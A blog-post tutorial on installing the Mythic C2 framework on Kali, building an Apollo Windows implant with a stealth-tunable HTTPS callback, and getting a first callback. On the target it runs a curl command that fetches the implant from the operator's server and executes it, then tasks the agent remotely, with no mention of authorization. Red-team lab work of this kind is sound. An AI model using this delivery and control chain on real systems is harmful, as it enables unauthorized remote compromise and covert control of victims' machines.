---
title: "Installing Mythic C2 on Kali Linux"
date: 2025-04-24
layout: post
---

# Getting Started With Mythic C2 on Kali Linux

This guide shows how to install Mythic C2 on Kali, configure it, and get a first Windows callback using the Apollo agent and HTTP C2 profile.

---

## Prerequisites

- Fresh **Kali Linux 2025.2** VM (or supported Ubuntu/Debian).
- At least **2 CPUs** and **4 GB RAM**.
- Basic familiarity with Linux, Docker, and networking.

Official installation docs:  
`https://docs.mythic-c2.net/installation`

---

## 1. Clone Mythic and Install Dependencies

Create a tools folder and clone the Mythic repo:

```bash
mkdir ~/tools
cd ~/tools

git clone https://github.com/its-a-feature/Mythic.git
cd Mythic
```

Install Docker and Docker Compose using Mythic’s helper script (Kali example):

```bash
sudo ./install_docker_kali.sh
```

For Ubuntu or Debian, use:

```bash
sudo ./install_docker_ubuntu.sh
# or
sudo ./install_docker_debian.sh
```

---

## 2. Build the Mythic CLI and Generate Config

Build the Mythic CLI binary from the main Mythic folder:

```bash
sudo make
```

Generate the `mythic.env` config file:

```bash
sudo ./mythic-cli status
```

View the generated configuration:

```bash
cat mythic.env
```

This file contains database credentials, RabbitMQ passwords, the Mythic admin password, ports, and more.

---

## 3. Start Mythic and Log In

Start Mythic:

```bash
sudo ./mythic-cli start
```

Wait until all services, including GraphQL, are ready.

Open the web UI in a browser on the Mythic host:

```text
https://127.0.0.1:7443
```

Accept the certificate warning.

Login credentials:

- Username: `mythic_admin`
- Password (from `mythic.env`):

  ```bash
  grep -i mythic_admin_password mythic.env
  ```

Paste that value into the password field and log in.

---

## 4. Install and Configure the HTTP C2 Profile

Install the bundle of C2 profiles:

```bash
sudo ./mythic-cli install github https://github.com/its-a-feature/Mythic_C2_Profiles.git
```

In the web UI:

1. Go to **Installed Services → C2 Profiles**.
2. Locate the **http** profile.
3. Under **Actions**, select **View/Edit Config**.
4. Set:

   ```text
   port: 443
   use_ssl: true
   ```

5. Click **Submit** and wait until the profile shows it is accepting connections.

---

## 5. Install the Apollo Agent

Install Apollo:

```bash
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
```

Restart Mythic:

```bash
sudo ./mythic-cli restart
```

After services are back up, in the web UI go to **Installed Services → Payload Types** and confirm that **Apollo** is listed.

---

## 6. Generate a Windows Payload

In the web UI:

1. Go to **Payloads**.
2. Click **Generate New Payload**.
3. Select:
   - OS: **Windows**
   - Payload type: **Apollo**
   - Output type: `win.exe`
4. Enable “automatically adjust the payload extension”.
5. Keep default shellcode and bypass options, or adjust as needed.
6. On the commands screen, keep the defaults or add commands you need (for example, `whoami`).
7. On the profiles screen:
   - Enable the **http** profile.
   - Set **Callback host** to your Mythic server IP, for example:

     ```text
     https://10.10.10.140
     ```

   - Set **Callback port** to `443`.
   - Set a callback interval and jitter (lower values = faster, higher = stealthier).

8. Click **Next**.
9. Set:
   - Name: `A1`
   - Description: for example, `Apollo payload with HTTP profile`
10. Click **Create Payload**.
11. When ready, click **Download** to save `A1.exe`.

---

## 7. Deliver and Run the Payload

On the Mythic/Kali host, serve the payload via a simple HTTP server:

```bash
cd ~/Downloads   # or wherever A1.exe is
python3 -m http.server 8000
```

On the Windows Server 2022 target:

```powershell
cd C:\Users\Administrator\Downloads
curl http://10.10.10.140:8000/A1.exe -o A1.exe
A1.exe
```

The console will appear to hang; that indicates the agent is running.

---

## 8. Confirm the Callback and Task the Agent

Back in the Mythic web UI:

1. Go to **Active Callbacks**.
2. You should see a new callback from Apollo.
3. Right‑click the callback and select **Interact**.

In the interaction console, run:

```text
help
```

Then, for example:

```text
shell ipconfig /all
```

When the agent checks in, it will execute the command and return the output in the UI.
